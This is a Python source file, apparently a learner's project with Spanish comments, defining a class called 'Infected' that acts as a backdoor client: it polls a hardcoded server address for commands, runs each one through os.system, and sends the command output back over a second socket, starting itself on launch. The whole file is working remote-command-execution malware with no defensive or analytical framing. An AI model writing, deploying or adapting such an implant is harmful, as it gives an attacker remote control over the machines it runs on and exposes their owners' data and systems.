import socket
from time import sleep
import os
import tempfile

class Infected:

    def __init__(self, ip, portReceiveCommand, portSendOutput):
        self.ipServer = ip
        self.portReceiveCommand = portReceiveCommand
        self.portSendOutput = portSendOutput
        self.lastAction = "None"
        self.isNotFinish = True
        
    def getDataFromSocket(self, socket):
        return socket.recv(2000).decode("utf-8")
                
    def listenForAction(self):
        while self.isNotFinish:
            # Create a TCP/IP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
            # Connect the socket to the port where the server is listening
            server_address = (self.ipServer, self.portReceiveCommand)
            sock.connect(server_address)            
            try:
                # Receive action
                action = self.getDataFromSocket(sock)                
            finally:
                sock.close()
            
            if action != self.lastAction:
                self.lastAction = action
                self.executeAction(action)
                
            else:
                sleep(10)
    
    def executeAction(self, action):
        actionAux = action.split(" @ ")
        action = actionAux[0] + " > %tmp%/file.txt"
        self.isNotFinish = actionAux[1].startswith("T")
        print(action)        # porque este print?
        os.system(action)  
        self.sendOutput() # se cambia por output mas adelante
    
    def readCommand(self):
        
        path = tempfile.gettempdir() + "/file.txt"
        infile = open(path, 'r')
        text = ""
        for line in infile:
            text += line   #no falta el espacio entre string?
        infile.close()  
        return text        
    
    def sendOutput(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        server_address = (self.ipServer, self.portSendOutput)
        sock.connect(server_address)
        output = self.readCommand()
        
        try:
            # Receive action
            sock.sendall(bytes(output,"utf-8"))     #no hay una forma de enviarlo , pero no como bytes?           
        finally:
            sock.close()  
                
  
     
    
inf = Infected("10.12.5.43", 10000, 10001)
inf.listenForAction()